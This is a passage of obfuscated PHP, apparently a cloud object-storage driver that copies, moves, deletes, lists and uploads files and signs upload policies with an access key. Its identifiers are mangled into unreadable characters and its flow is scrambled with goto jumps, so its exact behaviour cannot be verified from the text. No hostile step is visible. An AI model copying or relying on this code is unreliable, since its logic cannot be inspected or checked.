$cÈ…ÛËá…É); $this->cacheMethod($a¤àŠïÇ®[199], $aËÛ³£¹¨ö, array($a¤àŠïÇ®[78] => $F½¼»İœµ¸, $a¤àŠïÇ®[1256] => $F½¼»İœµ¸, $a¤àŠïÇ®[84] => strtotime($AÕô‹ï„ù¶), $a¤àŠïÇ®[1257] => $AÕô‹ï„ù¶)); } if ($cÈ…ÛËá…É) { $BÇœË¢×»É[] = $aËÛ³£¹¨ö; continue; } $fñ×ã—¾§¡[] = $Bò½Ì¢èí©; goto aè¾„­ÆÈ¤; aè¾„­ÆÈ¤: } foreach ($aßÈ¿Ø×æÍ as $a×Œ¬âÌ•») { $BÇœË¢×»É[] = $a×Œ¬âÌ•»->getPrefix(); if ($EÉÖ³±‹œ) { $this->cacheMethod($a¤àŠïÇ®[198], $aËÛ³£¹¨ö, !0); } } if ($AŸŒ†ëŒ === $a¤àŠïÇ®[33]) { break; } } if ($EÉÖ³±‹œ) { $this->cacheMethod($a¤àŠïÇ®[198], $f¨¥¶ƒ¹, !0); } goto E›ø´×Ğ¯; E›ø´×Ğ¯: return array($a¤àŠïÇ®[75] => $BÇœË¢×»É, $a¤àŠïÇ®[74] => $fñ×ã—¾§¡); goto a¨Óå§™¬; aŠàí’‘¾ä: $AŸŒ†ëŒ = $a¤àŠïÇ®[33]; $fˆ†šéóİŸ = 1000; $EÉÖ³±‹œ = $this->listItemCache === !1 ? !1 : !0; goto a“Î¬Ñ¬ª; b®éô†´æ¸: $a¤àŠïÇ® =& $_SERVER[Ïº«‚ßèÔˆø]; $f¨¥¶ƒ¹ = trim($f¨¥¶ƒ¹, $a¤àŠïÇ®[8]); $bâÚßÇ…‡¹ = empty($f¨¥¶ƒ¹) ? $a¤àŠïÇ®[33] : $f¨¥¶ƒ¹ . $a¤àŠïÇ®[8]; goto aŠàí’‘¾ä; a¨Óå§™¬: } public function copyFile($F¹Ä„™¨§³, $CÄ§áìµ“È) { $D…Ñ†İ”Æ = $this->size($F¹Ä„™¨§³); if ($D…Ñ†İ”Æ < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $F¹Ä„™¨§³, $this->bucket, $this->pathEncode($CÄ§áìµ“È)); } catch (OSS\Core\OssException $aÄñœĞ‰öæ) { return !1; } return $this->getPathOuter($CÄ§áìµ“È); } $C‘»Ú¬•µ = $this->multiCopyObject($F¹Ä„™¨§³, $CÄ§áìµ“È, $D…Ñ†İ”Æ); return $C‘»Ú¬•µ ? $this->getPathOuter($CÄ§áìµ“È) : !1; } private function multiCopyObject($d“°Ö¼ã·, $aªÆœ‹—Ì«, $eÖ»Ñì·À‹) { $d™Òã«Ò¥¨ =& $_SERVER[Ïº«‚ßèÔˆø]; try { goto AÛ«×‘œÍ; AÛ«×‘œÍ: $FŸÑ×äÒí… = array(); if ($CÂóŸ‘Ğ„º = $this->hashMd5($d“°Ö¼ã·)) { $FŸÑ×äÒí… = array(OSS\OssClient::OSS_HEADERS => array($d™Òã«Ò¥¨[1258] => $CÂóŸ‘Ğ„º)); } $eßâ‘ºÇàö = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($aªÆœ‹—Ì«), $FŸÑ×äÒí…); goto EêŒêî¬Ò; EêŒêî¬Ò: $eÕ¶ãÌÉÓĞ = 1; $c‹†¥‰ïÆ¨ = 0; $D“Ê»³‹é = array(); goto d”İî™ÀŠ‘; d”İî™ÀŠ‘: $f—î„ØõÏÀ = 1024 * 1024 * 10; $BèÎÈ³íí¿ = $this->client->generateMultiuploadParts($eÖ»Ñì·À‹, $f—î„ØõÏÀ); foreach ($BèÎÈ³íí¿ as $féê¾±Æ­¼ => $dĞµÎÜ’) { $DâÑ¶åîö = $c‹†¥‰ïÆ¨ + (int) $dĞµÎÜ’[$d™Òã«Ò¥¨[1259]]; $aĞ˜öÜ‘Å× = (int) $dĞµÎÜ’[$d™Òã«Ò¥¨[334]] + $DâÑ¶åîö - 1; $Dáä´ªÅÅÅ = array($d™Òã«Ò¥¨[1260] => $DâÑ¶åîö, $d™Òã«Ò¥¨[1261] => $aĞ˜öÜ‘Å×); $D“Ê»³‹é[] = $this->client->uploadPartCopy($this->bucket, $d“°Ö¼ã·, $this->bucket, $this->pathEncode($aªÆœ‹—Ì«), $eÕ¶ãÌÉÓĞ, $eßâ‘ºÇàö, $Dáä´ªÅÅÅ); $eÕ¶ãÌÉÓĞ = $eÕ¶ãÌÉÓĞ + 1; } goto BÇÍçé¯ªÅ; BÇÍçé¯ªÅ: $E‹¾³ïÕ¹ù = array(); foreach ($D“Ê»³‹é as $féê¾±Æ­¼ => $b‚¤Êì•¾ì) { $E‹¾³ïÕ¹ù[] = array($d™Òã«Ò¥¨[1262] => $féê¾±Æ­¼ + 1, $d™Òã«Ò¥¨[1263] => $b‚¤Êì•¾ì); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($aªÆœ‹—Ì«), $eßâ‘ºÇàö, $E‹¾³ïÕ¹ù); goto A˜äóôŞ»; A˜äóôŞ»: } catch (OSS\Core\OssException $b”½Ã”÷É—) { return !1; } return !0; } public function moveFile($a®¹ç¤ÏÁ, $fâ±œìƒÍ) { if ($this->copyFile($a®¹ç¤ÏÁ, $fâ±œìƒÍ)) { $this->remove($a®¹ç¤ÏÁ); return $this->getPathOuter($fâ±œìƒÍ); } return !1; } public function delFile($cîÁŞŒ±«) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($cîÁŞŒ±«)); } catch (OSS\Core\OssException $cí…ÇÄöÔß) { return !1; } return !0; } public function delFolder($f°ÆŸËšÁ) { goto bË–‚…éä×; Açñ¬ğßâ: return $this->delByBatch($cÆ‹Ïó˜î†[$A´ÓÚÙÜÍ[75]]); goto e©ù‚íŸÜ; e„‡ŒÌã: if (!empty($f°ÆŸËšÁ) && !in_array($f£ÌÄÒÅË, $cÆ‹Ïó˜î†[$A´ÓÚÙÜÍ[75]])) { $cÆ‹Ïó˜î†[$A´ÓÚÙÜÍ[75]][] = $f£ÌÄÒÅË; } $Dï®¢‡‘± = $this->delByBatch($cÆ‹Ïó˜î†[$A´ÓÚÙÜÍ[74]]); if (!$Dï®¢‡‘±) { return !1; } goto Açñ¬ğßâ; bŒï·™†æè: $cÆ‹Ïó˜î† = $this->fileList($f°ÆŸËšÁ); $this->listItemCache = !0; $f£ÌÄÒÅË = trim($f°ÆŸËšÁ, $A´ÓÚÙÜÍ[8]) . $A´ÓÚÙÜÍ[8]; goto e„‡ŒÌã; bË–‚…éä×: $A´ÓÚÙÜÍ =& $_SERVER[Ïº«‚ßèÔˆø]; if (!$this->exist($f°ÆŸËšÁ)) { return !0; } $this->listItemCache = !1; goto bŒï·™†æè; e©ù‚íŸÜ: } private function delByBatch($aŒË° ¿Ìæ) { foreach (array_chunk($aŒË° ¿Ìæ, 1000) as $D‚İÑøÕÎï) { try { $this->client->deleteObjects($this->bucket, $D‚İÑøÕÎï); } catch (OSS\Core\OssException $D…œ´ƒ‹ãš) { return !1; } } return !0; } public function rename($EÓğŠÁÊ™È, $AŠ« Åš¥Ÿ) { return $this->renameObject($EÓğŠÁÊ™È, $AŠ« Åš¥Ÿ); } private function fileInfo($DŒ”ğŞ‘Ã, $C¤øöÕ›£ = false, $b÷º÷ŞÎÏå = array()) { goto DšâÔê®Ó‡; d¹Ì”åÜÊ: return $Dì’Œâ·ŸÇ; goto e™É‡¢Ğ™ø; FÉºäÆ Šë: $Dì’Œâ·ŸÇ[$a†¹Ğƒ¡Åò[193]] = $Dì’Œâ·ŸÇ[$a†¹Ğƒ¡Åò[84]] = 0; $Dì’Œâ·ŸÇ[$a†¹Ğƒ¡Åò[194]] = $Dì’Œâ·ŸÇ[$a†¹Ğƒ¡Åò[195]] = !0; if (empty($b÷º÷ŞÎÏå)) { $cìÛÆ™•Ïá = $this->objectMeta($DŒ”ğŞ‘Ã); if (!$cìÛÆ™•Ïá) { return $Dì’Œâ·ŸÇ; } $b÷º÷ŞÎÏå = array($a†¹Ğƒ¡Åò[84] => strtotime($cìÛÆ™•Ïá[$a†¹Ğƒ¡Åò[1257]]), $a†¹Ğƒ¡Åò[78] => $cìÛÆ™•Ïá[$a†¹Ğƒ¡Åò[1256]] + 0); } goto eËË•½‚Ş; eËË•½‚Ş: if (isset($b÷º÷ŞÎÏå[$a†¹Ğƒ¡Åò[78]])) { $Dì’Œâ·ŸÇ[$a†¹Ğƒ¡Åò[78]] = $b÷º÷ŞÎÏå[$a†¹Ğƒ¡Åò[78]]; } if (isset($b÷º÷ŞÎÏå[$a†¹Ğƒ¡Åò[84]])) { $Dì’Œâ·ŸÇ[$a†¹Ğƒ¡Åò[84]] = $b÷º÷ŞÎÏå[$a†¹Ğƒ¡Åò[84]]; } if (isset($b÷º÷ŞÎÏå[$a†¹Ğƒ¡Åò[196]]) && !trim($Dì’Œâ·ŸÇ[$a†¹Ğƒ¡Åò[84]])) { $Dì’Œâ·ŸÇ[$a†¹Ğƒ¡Åò[84]] = $b÷º÷ŞÎÏå[$a†¹Ğƒ¡Åò[196]]; } goto d¹Ì”åÜÊ; DšâÔê®Ó‡: $a†¹Ğƒ¡Åò =& $_SERVER[Ïº«‚ßèÔˆø]; $Dì’Œâ·ŸÇ = array($a†¹Ğƒ¡Åò[28] => $this->pathThis($DŒ”ğŞ‘Ã), $a†¹Ğƒ¡Åò[76] => $this->getPathOuter($DŒ”ğŞ‘Ã), $a†¹Ğƒ¡Åò[29] => $a†¹Ğƒ¡Åò[192], $a†¹Ğƒ¡Åò[78] => isset($b÷º÷ŞÎÏå[$a†¹Ğƒ¡Åò[78]]) ? $b÷º÷ŞÎÏå[$a†¹Ğƒ¡Åò[78]] : 0, $a†¹Ğƒ¡Åò[168] => $this->ext($DŒ”ğŞ‘Ã)); if ($C¤øöÕ›£) { return $Dì’Œâ·ŸÇ; } goto FÉºäÆ Šë; e™É‡¢Ğ™ø: } private function folderInfo($Dî”©Íˆ³, $E¢„„šŒ‘– = false, $e•Óõœ˜ì = array()) { goto Fò×Á¸’•ø; e®‚±“õµù: if (isset($e•Óõœ˜ì[$E°ÎÒÃç…Ş[84]])) { $b¹œæÔãÀí[$E°ÎÒÃç…Ş[84]] = $e•Óõœ˜ì[$E°ÎÒÃç…Ş[84]]; } if (isset($e•Óõœ˜ì[$E°ÎÒÃç…Ş[193]])) { $b¹œæÔãÀí[$E°ÎÒÃç…Ş[193]] = $e•Óõœ˜ì[$E°ÎÒÃç…Ş[193]]; } return $b¹œæÔãÀí; goto Cº–£…†Íá; f î «äá: $b¹œæÔãÀí[$E°ÎÒÃç…Ş[193]] = $b¹œæÔãÀí[$E°ÎÒÃç…Ş[84]] = 0; $b¹œæÔãÀí[$E°ÎÒÃç…Ş[194]] = $b¹œæÔãÀí[$E°ÎÒÃç…Ş[195]] = !0; if (empty($e•Óõœ˜ì)) { $Dî”©Íˆ³ = rtrim($Dî”©Íˆ³, $E°ÎÒÃç…Ş[8]) . $E°ÎÒÃç…Ş[8]; $CØå÷õé¬‚ = $this->objectMeta($Dî”©Íˆ³); if (!$CØå÷õé¬‚) { return $b¹œæÔãÀí; } $e•Óõœ˜ì = array($E°ÎÒÃç…Ş[193] => $CØå÷õé¬‚[$E°ÎÒÃç…Ş[1264]][$E°ÎÒÃç…Ş[1265]], $E°ÎÒÃç…Ş[84] => strtotime($CØå÷õé¬‚[$E°ÎÒÃç…Ş[1257]])); } goto e®‚±“õµù; Fò×Á¸’•ø: $E°ÎÒÃç…Ş =& $_SERVER[Ïº«‚ßèÔˆø]; $b¹œæÔãÀí = array($E°ÎÒÃç…Ş[28] => $this->pathThis($Dî”©Íˆ³), $E°ÎÒÃç…Ş[76] => $this->getPathOuter($E°ÎÒÃç…Ş[8] . $Dî”©Íˆ³), $E°ÎÒÃç…Ş[29] => $E°ÎÒÃç…Ş[77]); if ($E¢„„šŒ‘–) { return $b¹œæÔãÀí; } goto f î «äá; Cº–£…†Íá: } public function listPath($cÂ‚šî‰À§, $bç¯Î»ÕÙå = false) { $dÑí°Ÿ—Ü× =& $_SERVER[Ïº«‚ßèÔˆø]; $dÀ‡‰ƒ¸¼Ñ = $this->fileList($cÂ‚šî‰À§, $dÑí°Ÿ—Ü×[8], !0); foreach ($dÀ‡‰ƒ¸¼Ñ[$dÑí°Ÿ—Ü×[75]] as $f—‡ìÕ„Ş“ => $AŸé×ä£ğß) { $dÀ‡‰ƒ¸¼Ñ[$dÑí°Ÿ—Ü×[75]][$f—‡ìÕ„Ş“] = $this->folderInfo($AŸé×ä£ğß, $bç¯Î»ÕÙå, $AŸé×ä£ğß); } foreach ($dÀ‡‰ƒ¸¼Ñ[$dÑí°Ÿ—Ü×[74]] as $f—‡ìÕ„Ş“ => $AŸé×ä£ğß) { $dÀ‡‰ƒ¸¼Ñ[$dÑí°Ÿ—Ü×[74]][$f—‡ìÕ„Ş“] = $this->fileInfo($AŸé×ä£ğß[$dÑí°Ÿ—Ü×[28]], $bç¯Î»ÕÙå, $AŸé×ä£ğß); } return $dÀ‡‰ƒ¸¼Ñ; } public function has($fÛ‘´·ˆ†ñ, $BÂŸñÓÂê† = false, $FÀ•ĞÖªô¢ = true) { goto AàÌ±àŠ¶ö; AàÌ±àŠ¶ö: $Cãˆ¬”ïêĞ =& $_SERVER[Ïº«‚ßèÔˆø]; $fÛ‘´·ˆ†ñ = trim($fÛ‘´·ˆ†ñ, $Cãˆ¬”ïêĞ[8]); $fÉ¦™‡†Öñ = empty($fÛ‘´·ˆ†ñ) ? $Cãˆ¬”ïêĞ[33] : $fÛ‘´·ˆ†ñ . $Cãˆ¬”ïêĞ[8]; goto Aíâ—²Ø®; EÊ„½Ç®Ú: while (!0) { check_abort(); $d†Ş±’í‹ = array($Cãˆ¬”ïêĞ[1252] => $Cãˆ¬”ïêĞ[8], $Cãˆ¬”ïêĞ[1253] => $fÉ¦™‡†Öñ, $Cãˆ¬”ïêĞ[1254] => $c³‰ÕÃ“½Æ, $Cãˆ¬”ïêĞ[1255] => $eÔ–¸¾­Œğ); try { $C—¶¤àù—Ó = $this->client->listObjects($this->bucket, $d†Ş±’í‹); } catch (OSS\Core\OssException $aš­“±ƒØ‰) { break; } $eÔ–¸¾­Œğ = $C—¶¤àù—Ó->getNextMarker(); $DÙ³ª®±‡® = $C—¶¤àù—Ó->getObjectList(); $EÄÚ‰ºÃ¶¨ = $C—¶¤àù—Ó->getPrefixList(); if ($BÂŸñÓÂê†) { if (count($DÙ³ª®±‡®) > 1 || count($DÙ³ª®±‡®) == 1 && $DÙ³ª®±‡®[0]->getKey() != $fÉ¦™‡†Öñ) { $EªİÜ¿Ä¨ += count($DÙ³ª®±‡®) - 1; } if (!empty($EÄÚ‰ºÃ¶¨)) { $A…›˜×´ÉÃ += count($EÄÚ‰ºÃ¶¨); } if ($eÔ–¸¾­Œğ === $Cãˆ¬”ïêĞ[33]) { break; } continue; } if ($FÀ•ĞÖªô¢) { if (!empty($DÙ³ª®±‡®)) { if (count($DÙ³ª®±‡®) > 1 || $DÙ³ª®±‡®[0]->getKey() != $fÉ¦™‡†Öñ) { return !0; } } } else { if (!empty($EÄÚ‰ºÃ¶¨)) { return !0; } } if ($eÔ–¸¾­Œğ === $Cãˆ¬”ïêĞ[33]) { break; } } if ($BÂŸñÓÂê†) { return array($Cãˆ¬”ïêĞ[202] => $EªİÜ¿Ä¨, $Cãˆ¬”ïêĞ[203] => $A…›˜×´ÉÃ); } return !1; goto fˆ•µŞîÆ; Aíâ—²Ø®: $eÔ–¸¾­Œğ = $Cãˆ¬”ïêĞ[33]; $c³‰ÕÃ“½Æ = 500; $EªİÜ¿Ä¨ = $A…›˜×´ÉÃ = 0; goto EÊ„½Ç®Ú; fˆ•µŞîÆ: } public function listAll($B‡‹™ßÒÖ) { $DòÓÅ‹Œ =& $_SERVER[Ïº«‚ßèÔˆø]; $a ĞŠ—ÈßŒ = $this->fileList($B‡‹™ßÒÖ, $DòÓÅ‹Œ[33], !0); $eŸÉÑ’øÛ = array(); foreach ($a ĞŠ—ÈßŒ[$DòÓÅ‹Œ[74]] as $F°ÄÇİÑöÁ) { $eŸÉÑ’øÛ[$F°ÄÇİÑöÁ[$DòÓÅ‹Œ[28]]] = $F°ÄÇİÑöÁ[$DòÓÅ‹Œ[78]]; } foreach ($a ĞŠ—ÈßŒ[$DòÓÅ‹Œ[75]] as $F°ÄÇİÑöÁ) { if (is_string($F°ÄÇİÑöÁ)) { $eŸÉÑ’øÛ[$F°ÄÇİÑöÁ] = 0; } } return $this->listAllFiles($B‡‹™ßÒÖ, array_keys($eŸÉÑ’øÛ), $eŸÉÑ’øÛ); } public function canRead($c³óƒ·çÀ) { $EÌ÷µ¨ºÏÁ =& $_SERVER[Ïº«‚ßèÔˆø]; $B¶·µŒÔõğ = $this->pathAcl($c³óƒ·çÀ); return $B¶·µŒÔõğ == $EÌ÷µ¨ºÏÁ[1266] || $B¶·µŒÔõğ == $EÌ÷µ¨ºÏÁ[518] ? !0 : !1; } public function canWrite($A¢êÆ«´î¾) { $DÃŠ½²ê÷• = $this->pathAcl($A¢êÆ«´î¾); return $DÃŠ½²ê÷• == $_SERVER[Ïº«‚ßèÔˆø][518] ? !0 : !1; } public function pathAcl($c„ƒï¢Ñ) { goto a•ªì×Œõ¢; añ†²¨²„ç: return $D»Æ¦‚—çÓ; goto EõÊğçÅÍí; föÅõÇºó²: $D»Æ¦‚—çÓ = $EÄÌŠé†áá == $CíïÇ·öØ¬[34] ? $this->bucketAcl : $EÄÌŠé†áá; if ($D»Æ¦‚—çÓ == $CíïÇ·öØ¬[1267]) { return $CíïÇ·öØ¬[1266]; } if ($D»Æ¦‚—çÓ == $CíïÇ·öØ¬[1268]) { return $CíïÇ·öØ¬[518]; } goto añ†²¨²„ç; a•ªì×Œõ¢: $CíïÇ·öØ¬ =& $_SERVER[Ïº«‚ßèÔˆø]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $EÄÌŠé†áá = $this->client->getObjectAcl($this->bucket, $this->pathEncode($c„ƒï¢Ñ)); } catch (OSS\Core\OssException $D°ôÚÜôÄ‚) { return !1; } goto föÅõÇºó²; EõÊğçÅÍí: } private function chmodPath($C‘ïÏ–¡ÈŞ, $F„ê¬‰¸ìÜ = '') { $B’†Œ¯å×Œ =& $_SERVER[Ïº«‚ßèÔˆø]; $D‡Æê¦Ü = empty($F„ê¬‰¸ìÜ) ? $B’†Œ¯å×Œ[1268] : $F„ê¬‰¸ìÜ; $E©äÆ©İØ© = array($B’†Œ¯å×Œ[34], $B’†Œ¯å×Œ[191], $B’†Œ¯å×Œ[1267], $B’†Œ¯å×Œ[1268]); if (!in_array($D‡Æê¦Ü, $E©äÆ©İØ©)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($C‘ïÏ–¡ÈŞ), $D‡Æê¦Ü); } catch (OSS\Core\OssException $dõìãİ´Ù‚) { return !1; } return !0; } public function getContent($cèèÛÏÑ±¢) { return $this->fileSubstr($cèèÛÏÑ±¢, -1); } public function setContent($Fà„¿Íã»Ú, $FëÃŸ¸‹©á = '') { $B’œñÁ¸íÏ =& $_SERVER[Ïº«‚ßèÔˆø]; try { $Cí•ˆè”Şí = $this->trafficLimit($B’œñÁ¸íÏ[1269]); $E”à‚ˆÎã° = $this->client->putObject($this->bucket, $this->pathEncode($Fà„¿Íã»Ú), $FëÃŸ¸‹©á, $Cí•ˆè”Şí); } catch (OSS\Core\OssException $BŒõâŠÈ†ï) { return !1; } $c¥ŸÔ§ß‰Ñ = array($B’œñÁ¸íÏ[1258] => trim($E”à‚ˆÎã°[$B’œñÁ¸íÏ[1270]], $B’œñÁ¸íÏ[116]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($Fà„¿Íã»Ú))); $this->updateObjMeta($Fà„¿Íã»Ú, $c¥ŸÔ§ß‰Ñ); return isset($E”à‚ˆÎã°[$B’œñÁ¸íÏ[1271]][$B’œñÁ¸íÏ[1217]]) ? !0 : !1; } private function updateObjMeta($FÖ§¢œ«“İ, $CØÂÇ¥Ç¨Ø) { $FÖ§¢œ«“İ = $this->pathEncode($FÖ§¢œ«“İ); try { $f‹Šù‹Ô = array(OSS\OssClient::OSS_HEADERS => $CØÂÇ¥Ç¨Ø); $this->client->copyObject($this->bucket, $FÖ§¢œ«“İ, $this->bucket, $FÖ§¢œ«“İ, $f‹Šù‹Ô); } catch (OSS\Core\OssException $d–ÏÊ®°) { return !1; } return !0; } public function upload($B´„Æ‘‰Øˆ, $Déêµ°Ø·Î, $bĞæ…®Ï† = false, $aø½ê¢Õ © = REPEAT_REPLACE) { $cïÂÈ­ŠÖ =& $_SERVER[Ïº«‚ßèÔˆø]; $c®½‡ƒî”Ü = trim($B´„Æ‘‰Øˆ, $cïÂÈ­ŠÖ[8]); $dÕ†Íë„äŒ = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($cïÂÈ­ŠÖ[1258] => @md5_file($Déêµ°Ø·Î)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($B´„Æ‘‰Øˆ))); $dÕ†Íë„äŒ = $this->trafficLimit($cïÂÈ­ŠÖ[1269], $dÕ†Íë„äŒ); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($c®½‡ƒî”Ü), $Déêµ°Ø·Î, $dÕ†Íë„äŒ); } catch (OSS\Core\OssException $cÜğÎåÌ¢ã) { return !1; } return $this->getPathOuter($B´„Æ‘‰Øˆ); } public function getHost() { $e¸›ë×Ù’ =& $_SERVER[Ïº«‚ßèÔˆø]; $aì¸ÏÂ„Ìï = explode($e¸›ë×Ù’[177], parent::getHost()); return $aì¸ÏÂ„Ìï[0] . $e¸›ë×Ù’[177] . $this->bucket . $e¸›ë×Ù’[95] . $aì¸ÏÂ„Ìï[1]; } public function uploadFormData($FâÊ…”â‡, $AÄ½„Ú ö = 3600) { goto DÜÄ‹Ãá¥; BµíÚ‘îÁ–: $f¬× °Ğ†Ğ = base64_encode(hash_hmac($A¤ƒö”‹…Ó[229], $DäßÎØÖ¼, $this->secret, !0)); $B·Ş·—‘† = array($A¤ƒö”‹…Ó[1182] => $DäßÎØÖ¼, $A¤ƒö”‹…Ó[1275] => $this->accessKey, $A¤ƒö”‹…Ó[1178] => $A¤ƒö”‹…Ó[1170], $A¤ƒö”‹…Ó[1276] => $f¬× °Ğ†Ğ, $A¤ƒö”‹…Ó[175] => $C´½±¸ˆ Ü); $B·Ş·—‘† = $this->trafficLimit($A¤ƒö”‹…Ó[1269], $B·Ş·—‘†); goto C„âğİßğ; DÜÄ‹Ãá¥: $A¤ƒö”‹…Ó =& $_SERVER[Ïº«‚ßèÔˆø]; if (!($C´½±¸ˆ Ü = $this->getHost())) { return !1; } $dñ½£Œµ¡­ = $AÄ½„Ú ö; goto còÃ³ğŞ½Ì; còÃ³ğŞ½Ì: $Dñ£ˆç¢«ê = date($A¤ƒö”‹…Ó[1272], time() + $dñ½£Œµ¡­); $a„†Ì÷¤îø = new DateTime($Dñ£ˆç¢«ê); $eŒÛ·ƒ½×ò = $a„†Ì÷¤îø->format(DateTime::ISO8601); goto cŞÇó‚İÓ¨; cŞÇó‚İÓ¨: $d½ÑÌÂÁ•¥ = strpos($eŒÛ·ƒ½×ò, $A¤ƒö”‹…Ó[293]); $eŒÛ·ƒ½×ò = substr($eŒÛ·ƒ½×ò, 0, $d½ÑÌÂÁ•¥) . $A¤ƒö”‹…Ó[1273]; $d‚½——Ó­½ = 1048576000 * 5; goto A¾¨ø•­§; C„âğİßğ: return $B·Ş·—‘†; goto b¾£ÇÎ²¶ˆ; A¾¨ø•­§: $DØ¥İêÚæÆ = $this->pathFather($FâÊ…”â‡); $AÅ¸ ˆ¶â¾ = array($A¤ƒö”‹…Ó[1172] => $eŒÛ·ƒ½×ò, $A¤ƒö”‹…Ó[1173] => array(array($A¤ƒö”‹…Ó[1274], 0, $d‚½——Ó­½), array($A¤ƒö”‹…Ó[1176], $A¤ƒö”‹…Ó[1177], $DØ¥İêÚæÆ))); $DäßÎØÖ¼ = base64_encode(json_encode($AÅ¸ ˆ¶â¾)); goto BµíÚ‘îÁ–; b¾£ÇÎ²¶ˆ: } public function multiUploadFormData($cÃƒå•ÀÎç, $BË‡ª¸–Œ® = 3600) { $a®™‰¯Œ¸ =& $_SERVER[Ïº«‚ßèÔˆø]; if (!($Dƒ Ë”è¸› = $this->getHost())) { return !1; } $aÔÒĞŞÕƒœ = $this->trafficLimit($a®™‰¯Œ¸[1269]); $f²Š²¬•¤è = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($cÃƒå•ÀÎç), $aÔÒĞŞÕƒœ); return array($a®™‰¯Œ¸[220] => $f²Š²¬•¤è, $a®™‰¯Œ¸[175] => $Dƒ Ë”è¸› . $a®™‰¯Œ¸[8] . $this->pathEncode($cÃƒå•ÀÎç), $a®™‰¯Œ¸[221] => gmdate($a®™‰¯Œ¸[1277]), $a®™‰¯Œ¸[93] => $cÃƒå•ÀÎç); } public function multiUploadAuthData($c­½ÖŠÛ™, $Bö¬‰áÄÑÎ = array()) { goto fÊõ»¤; fÊõ»¤: $B’¤Ã‚¼† =& $_SERVER[Ïº«‚ßèÔˆø]; $a²‘Ğª¯”ã = isset($Bö¬‰áÄÑÎ[$B’¤Ã‚¼†[221]]) ? $Bö¬‰áÄÑÎ[$B’¤Ã‚¼†[221]] : gmdate($B’¤Ã‚¼†[1277]); $fãõÕ‰Ì½ = isset($Bö¬‰áÄÑÎ[$B’¤Ã‚¼†[168]]) ? $Bö¬‰áÄÑÎ[$B’¤Ã‚¼†[168]] : $B’¤Ã‚¼†[33]; goto a½¨Å°»˜‚; AÂ™øàÅ¿Õ: if (!empty($Bö¬‰áÄÑÎ[$B’¤Ã‚¼†[1279]])) { $C‡ˆŒ´ÙìÔ = array_merge(array($E¥ÖÛ®ÑÄ[4]), $Bö¬‰áÄÑÎ[$B’¤Ã‚¼†[1279]]); sort($C‡ˆŒ´ÙìÔ); $E¥ÖÛ®ÑÄ[4] = implode($B’¤Ã‚¼†[228], $C‡ˆŒ´ÙìÔ); } $EÙºÖ—ŠŒÂ = implode($B’¤Ã‚¼†[228], $E¥ÖÛ®ÑÄ); $FêãƒÑáãÁ = base64_encode(hash_hmac($B’¤Ã‚¼†[229], $EÙºÖ—ŠŒÂ, $this->secret, !0)); goto Eåë—ïŸÒ; a½¨Å°»˜‚: $A¨Ãï§ÀÄè = $c­½ÖŠÛ™; if (isset($Bö¬‰áÄÑÎ[$B’¤Ã‚¼†[93]])) { $A¨Ãï§ÀÄè = $Bö¬‰áÄÑÎ[$B’¤Ã‚¼†[93]]; unset($Bö¬‰áÄÑÎ[$B’¤Ã‚¼†[93]]); } if (isset($Bö¬‰áÄÑÎ[$B’¤Ã‚¼†[222]])) { $Bö¬‰áÄÑÎ[$B’¤Ã‚¼†[221]] = $a²‘Ğª¯”ã; return $this->listUploadParts($A¨Ãï§ÀÄè, $Bö¬‰áÄÑÎ); } goto a•Õ‚—¡±Œ; Eåë—ïŸÒ: $Eä²·”¯İ‡ = $B’¤Ã‚¼†[1242] . $this->accessKey . $B’¤Ã‚¼†[4] . $FêãƒÑáãÁ; if (strpos($fãõÕ‰Ì½, $B’¤Ã‚¼†[224]) === 0) { $Eä²·”¯İ‡ = array($B’¤Ã‚¼†[231] => $Eä²·”¯İ‡, $B’¤Ã‚¼†[221] => $a²‘Ğª¯”ã); if ($Cçì÷šøÇÏ) { $Eä²·”¯İ‡ = array_merge($Eä²·”¯İ‡, $Cçì÷šøÇÏ); } } return $Eä²·”¯İ‡; goto b«‘ªê·§Í; a•Õ‚—¡±Œ: $E¥ÖÛ®ÑÄ = array($B’¤Ã‚¼†[223], $B’¤Ã‚¼†[33], $B’¤Ã‚¼†[119], $a²‘Ğª¯”ã, "\170\x2d\x6f\x73\163\55\x64\x61\x74\x65\x3a{$a²‘Ğª¯”ã}", $B’¤Ã‚¼†[8] . $this->bucket . $B’¤Ã‚¼†[8] . $A¨Ãï§ÀÄè . $fãõÕ‰Ì½); if (strpos($fãõÕ‰Ì½, $B’¤Ã‚¼†[224]) === 0) { $E¥ÖÛ®ÑÄ[0] = $B’¤Ã‚¼†[225]; if ($Cçì÷šøÇÏ = $this->trafficLimit($B’¤Ã‚¼†[1269])) { $A¨Ãï§ÀÄè = $B’¤Ã‚¼†[1278]; array_splice($E¥ÖÛ®ÑÄ, 5, 0, $A¨Ãï§ÀÄè . $B’¤Ã‚¼†[4] . $Cçì÷šøÇÏ[$A¨Ãï§ÀÄè]); } } if (isset($Bö¬‰áÄÑÎ[$B’¤Ã‚¼†[226]]) && $Bö¬‰áÄÑÎ[$B’¤Ã‚¼†[226]] == $B’¤Ã‚¼†[227]) { $E¥ÖÛ®ÑÄ[0] = $B’¤Ã‚¼†[227]; } goto AÂ™øàÅ¿Õ; b«‘ªê·§Í: } public function listUploadParts($bŒ®Ìâƒ’¥, $F‡¥Ë‡­Ç™) { goto e–»İ‘˜; FÜ™êÕï«: return array($cÆ¦ÂŸœáÚ[231] => $C„àé…£¼¢, $cÆ¦ÂŸœáÚ[221] => $F‡¥Ë‡­Ç™[$cÆ¦ÂŸœáÚ[221]], $cÆ¦ÂŸœáÚ[233] => $fƒÈ©Õ£Õ); goto DŠäº¶¦…; a¿­¼‰ªÊŠ: unset($F‡¥Ë‡­Ç™[$cÆ¦ÂŸœáÚ[222]], $F‡¥Ë‡­Ç™[$cÆ¦ÂŸœáÚ[226]]); $C„àé…£¼¢ = $this->multiUploadAuthData($bŒ®Ìâƒ’¥, $F‡¥Ë‡­Ç™); if 